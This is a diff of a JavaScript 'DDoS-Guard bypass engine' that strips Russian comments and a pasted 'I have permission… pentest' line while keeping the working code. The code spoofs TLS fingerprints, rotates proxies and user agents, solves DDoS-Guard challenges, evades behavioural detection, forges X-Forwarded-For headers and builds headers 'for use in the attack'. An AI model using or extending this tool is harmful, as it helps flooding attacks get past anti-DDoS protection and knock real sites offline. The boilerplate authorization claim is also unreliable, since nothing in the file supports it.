@@ -1,7 +1,3 @@
-// ddosguard-bypass.js — DDoS-Guard Bypass Engine (2020–2026)
-// Чистый байпасс. Без браузера, без Selenium, без атакующей части.
-// I have permission and am authorized to perform this pentest
-
 const tls = require('tls');
 const https = require('https');
 const http = require('http');
@@ -11,10 +7,6 @@ const zlib = require('zlib');
 const { EventEmitter } = require('events');
 const fs = require('fs');
 const path = require('path');
-
-// ============================================================
-// HELPER
-// ============================================================
 
 function rs(l = 8) {
   const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
@@ -41,10 +33,6 @@ function rc(arr) {
 function b64(s) {
   return Buffer.from(s).toString('base64');
 }
-
-// ============================================================
-// TLS PROFILES
-// ============================================================
 
 const TLS_PROFILES = {
   chrome124: {
@@ -99,10 +87,6 @@ const TLS_PROFILES = {
   }
 };
 
-// ============================================================
-// USER-AGENTS
-// ============================================================
-
 const UAS = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
@@ -110,10 +94,6 @@ const UAS = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0'
 ];
-
-// ============================================================
-// HTTP CLIENT с TLS spoof + proxy
-// ============================================================
 
 class DdguFetcher {
   constructor(opts = {}) {
@@ -175,7 +155,6 @@ class DdguFetcher {
     const cs = this._cookieString();
     if (cs) h['Cookie'] = cs;
 
-    // WAF bypass headers
     if (Math.random() > 0.5) {
       h['DNT'] = '1';
     }
@@ -236,7 +215,6 @@ class DdguFetcher {
         let data = Buffer.alloc(0);
         const chunks = [];
 
-        // Проверяем Content-Encoding
         const encoding = res.headers['content-encoding'];
 
         res.on('data', (chunk) => chunks.push(chunk));
@@ -286,10 +264,6 @@ class DdguFetcher {
   }
 }
 
-// ============================================================
-// COOKIE CACHE
-// ============================================================
-
 class CookieCache {
   constructor(domain) {
     this.domain = domain;
@@ -320,14 +294,9 @@ class CookieCache {
   }
 }
 
-// ============================================================
-// CHALLENGE DETECTION
-// ============================================================
-
 function detectDdguChallenge(body, headers) {
   const text = typeof body === 'string' ? body : (body ? body.toString() : '');
 
-  // DDoS-Guard challenge page
   if (text.includes('DDoS protection by') ||
       text.includes('ddos-guard') ||
       text.includes('DDoS-GUARD') ||
@@ -336,7 +305,6 @@ function detectDdguChallenge(body, headers) {
     return { type: 'ddosguard_challenge', solver: 'js_solve' };
   }
 
-  // JS challenge (check.js style)
   if (text.includes('check.ddos-guard.net') ||
       text.includes('check.js') ||
       text.includes('new Image()') ||
@@ -344,19 +312,16 @@ function detectDdguChallenge(body, headers) {
     return { type: 'ddosguard_js', solver: 'check_js' };
   }
 
-  // ddgu endpoint redirect
   if (text.includes('ddgu.ddos-guard.net') ||
       text.includes('/ddgu/')) {
     return { type: 'ddosguard_endpoint', solver: 'endpoint' };
   }
 
-  // Captcha
   if (text.includes('captcha') || text.includes('CAPTCHA') ||
       text.includes('g-recaptcha') || text.includes('hcaptcha')) {
     return { type: 'captcha', solver: 'api' };
   }
 
-  // Blank response
   if (!text || text.trim().length < 10) {
     return { type: 'blank', solver: 'retry' };
   }
@@ -364,21 +329,12 @@ function detectDdguChallenge(body, headers) {
   return null;
 }
 
-// ============================================================
-// CHECK.JS SOLVER — как в C# примере
-// ============================================================
-
 function solveCheckJs(body, url) {
   const text = typeof body === 'string' ? body : body.toString();
-  // Ищем new Image().src = '...';
   const match = text.match(/new\s+Image\(\)\.src\s*=\s*['"](.+?)['"];?/);
   if (!match) return null;
   return match[1];
 }
-
-// ============================================================
-// MAIN BYPASS ENGINE
-// ============================================================
 
 class DDoSGuardBypass extends EventEmitter {
   constructor(opts = {}) {
@@ -431,15 +387,10 @@ class DDoSGuardBypass extends EventEmitter {
     return Object.keys(this.cookies).some(k => k.toLowerCase().includes('ddg'));
   }
 
-  /**
-   * Основной метод обхода DDoS-Guard.
-   * Возвращает { cookies, userAgent } при успехе.
-   */
   async bypass(targetUrl) {
     this.target = targetUrl;
     const url = new URL(targetUrl);
 
-    // Проверяем кэш
     if (this._hasDdguCookies()) {
       this.emit('log', 'ddgu_bypass', `Using cached cookies`);
       return { cookies: this.cookies, userAgent: this.userAgent };
@@ -447,9 +398,6 @@ class DDoSGuardBypass extends EventEmitter {
 
     this.emit('log', 'ddgu_bypass', `Starting bypass for ${url.hostname}`);
 
-    // ============================================================
-    // LAYER 1: Прямой GET с TLS impersonate (curl_cffi style)
-    // ============================================================
     for (let attempt = 0; attempt < 3; attempt++) {
       this._rotateProxy();
       const fetcher = this._createFetcher();
@@ -465,18 +413,13 @@ class DDoSGuardBypass extends EventEmitter {
         return { cookies: this.cookies, userAgent: this.userAgent };
       }
 
-      // Детектим челлендж
       const challenge = detectDdguChallenge(res.body, res.headers);
       if (challenge) {
         this.emit('log', 'challenge', `Layer 1 detected: ${challenge.type}`);
 
-        // ============================================================
-        // LAYER 2: CHECK.JS SOLVER (как в C# примере)
-        // ============================================================
         if (challenge.type === 'ddosguard_js' || challenge.type === 'ddosguard_challenge') {
           this.emit('log', 'challenge', 'Layer 2: Solving via check.js...');
 
-          // Шаг 1: GET check.ddos-guard.net/check.js
           const checkFetcher = this._createFetcher();
           const checkUrl = `https://check.ddos-guard.net/check.js`;
           const checkRes = await checkFetcher.get(checkUrl).catch(e => null);
@@ -484,12 +427,10 @@ class DDoSGuardBypass extends EventEmitter {
           if (checkRes) {
             this.cookies = { ...this.cookies, ...checkFetcher.cookies };
 
-            // Парсим new Image().src = '...'
             const validationPath = solveCheckJs(checkRes.body, url);
             if (validationPath) {
               this.emit('log', 'challenge', `Found validation path: ${validationPath}`);
 
-              // Шаг 2: GET validation endpoint
               const valFetcher = this._createFetcher(`https://${url.hostname}/`);
               const valUrl = `${url.protocol}//${url.hostname}${validationPath}`;
               const valRes = await valFetcher.get(valUrl).catch(e => null);
@@ -499,7 +440,6 @@ class DDoSGuardBypass extends EventEmitter {
               }
             }
 
-            // Шаг 3: Повторный GET на target с реферером
             const finalFetcher = this._createFetcher(`https://${url.hostname}/`);
             const finalRes = await finalFetcher.get(targetUrl).catch(e => null);
 
@@ -514,20 +454,15 @@ class DDoSGuardBypass extends EventEmitter {
           }
         }
 
-        // ============================================================
-        // LAYER 3: DDGU ENDPOINT HANDSHAKE (как в Python ddgu_endpoint)
-        // ============================================================
         if (!this._hasDdguCookies()) {
           this.emit('log', 'challenge', 'Layer 3: ddgu endpoint handshake...');
 
           const epFetcher = this._createFetcher(`https://${url.hostname}/`);
 
-          // Шаг 1: GET ddgu.ddos-guard.net/g
           const gUrl = `${url.protocol}//ddgu.ddos-guard.net/g`;
           await epFetcher.get(gUrl).catch(() => {});
           this.cookies = { ...this.cookies, ...epFetcher.cookies };
 
-          // Шаг 2: GET ddgu.ddos-guard.net/c
           const cUrl = `${url.protocol}//ddgu.ddos-guard.net/c`;
           await epFetcher.get(cUrl, {
             'Accept': '*/*',
@@ -535,7 +470,6 @@ class DDoSGuardBypass extends EventEmitter {
           }).catch(() => {});
           this.cookies = { ...this.cookies, ...epFetcher.cookies };
 
-          // Шаг 3: POST ddgu.ddos-guard.net/ddgu/ с закодированными параметрами
           const ddguUrl = `${url.protocol}//ddgu.ddos-guard.net/ddgu/`;
           const hEnc = b64(`${url.protocol}//${url.hostname}`);
           const uEnc = b64(url.pathname || '/');
@@ -549,7 +483,6 @@ class DDoSGuardBypass extends EventEmitter {
           }).catch(() => {});
           this.cookies = { ...this.cookies, ...epFetcher.cookies };
 
-          // Шаг 4: Финальный GET на target
           if (this._hasDdguCookies()) {
             const finalFetcher2 = this._createFetcher(`https://${url.hostname}/`);
             await finalFetcher2.get(targetUrl).catch(() => {});
@@ -563,29 +496,21 @@ class DDoSGuardBypass extends EventEmitter {
           }
         }
 
-        // ============================================================
-        // LAYER 4: ADVANCED — многоэтапный обход с куками
-        // ============================================================
         if (!this._hasDdguCookies()) {
           this.emit('log', 'challenge', 'Layer 4: Advanced multi-step bypass...');
 
-          // Пробуем комбинацию: check.js → ddgu endpoint → target
           const advFetcher = this._createFetcher();
 
-          // 1. GET check.js
           const cjsUrl = `https://check.ddos-guard.net/check.js`;
           await advFetcher.get(cjsUrl).catch(() => {});
           this.cookies = { ...this.cookies, ...advFetcher.cookies };
 
-          // 2. GET ddgu.ddos-guard.net/g
           await advFetcher.get(`${url.protocol}//ddgu.ddos-guard.net/g`).catch(() => {});
           this.cookies = { ...this.cookies, ...advFetcher.cookies };
 
-          // 3. GET ddgu.ddos-guard.net/c
           await advFetcher.get(`${url.protocol}//ddgu.ddos-guard.net/c`).catch(() => {});
           this.cookies = { ...this.cookies, ...advFetcher.cookies };
 
-          // 4. POST /ddgu/
           const hEnc2 = b64(`${url.protocol}//${url.hostname}`);
           const uEnc2 = b64(url.pathname || '/');
           const pEnc2 = b64(url.port || '');
@@ -594,7 +519,6 @@ class DDoSGuardBypass extends EventEmitter {
           ).catch(() => {});
           this.cookies = { ...this.cookies, ...advFetcher.cookies };
 
-          // 5. Финальный GET на target
           const finalFetcher3 = this._createFetcher(`https://${url.hostname}/`);
           await finalFetcher3.get(targetUrl).catch(() => {});
           this.cookies = { ...this.cookies, ...finalFetcher3.cookies };
@@ -606,24 +530,18 @@ class DDoSGuardBypass extends EventEmitter {
           }
         }
 
-        // ============================================================
-        // LAYER 5: 2026 ML Detection bypass
-        // ============================================================
         if (!this._hasDdguCookies() && challenge.type === 'ddosguard_challenge') {
           this.emit('log', 'challenge', 'Layer 5: ML/behavioural bypass (2026)...');
 
-          // Эмулируем естественное поведение: задержки, referer chain
           await new Promise(r => setTimeout(r, ri(1000, 3000)));
 
           const mlFetcher = this._createFetcher();
 
-          // Сначала несколько запросов к разным ресурсам
           await mlFetcher.get(`${url.protocol}//${url.hostname}/favicon.ico`).catch(() => {});
           await new Promise(r => setTimeout(r, ri(200, 800)));
           await mlFetcher.get(`${url.protocol}//${url.hostname}/robots.txt`).catch(() => {});
           await new Promise(r => setTimeout(r, ri(300, 1000)));
 
-          // Потом target с правильным referer chain
           const mlFinal = this._createFetcher(`https://${url.hostname}/robots.txt`);
           const mlRes = await mlFinal.get(targetUrl).catch(() => null);
 
@@ -638,13 +556,9 @@ class DDoSGuardBypass extends EventEmitter {
         }
       }
 
-      // Если не получили куки — пробуем следующий прокси
       await new Promise(r => setTimeout(r, ri(500, 1500)));
     }
 
-    // ============================================================
-// LAYER 6: BRUTE FORCE — перебор методов с разными прокси
-// ============================================================
     if (!this._hasDdguCookies()) {
       this.emit('log', 'challenge', 'Layer 6: Brute force methods with proxy rotation...');
 
@@ -701,9 +615,6 @@ class DDoSGuardBypass extends EventEmitter {
     return null;
   }
 
-  /**
-   * Получить заголовки для использования в атаке
-   */
   buildHeaders(extra = {}) {
     const ua = this.userAgent || rc(UAS);
     const h = {
@@ -720,7 +631,6 @@ class DDoSGuardBypass extends EventEmitter {
       h['Cookie'] = Object.entries(this.cookies).map(([k, v]) => `${k}=${v}`).join('; ');
     }
 
-    // WAF bypass
     if (Math.random() > 0.6) {
       h['X-Forwarded-For'] = `${ri(1,254)}.${ri(0,254)}.${ri(0,254)}.${ri(1,254)}`;
     }
@@ -735,9 +645,6 @@ class DDoSGuardBypass extends EventEmitter {
     return { ...h, ...extra };
   }
 
-  /**
-   * Проверить, валидны ли текущие куки
-   */
   async validate() {
     if (!this._hasDdguCookies()) return false;
     const url = new URL(this.target);
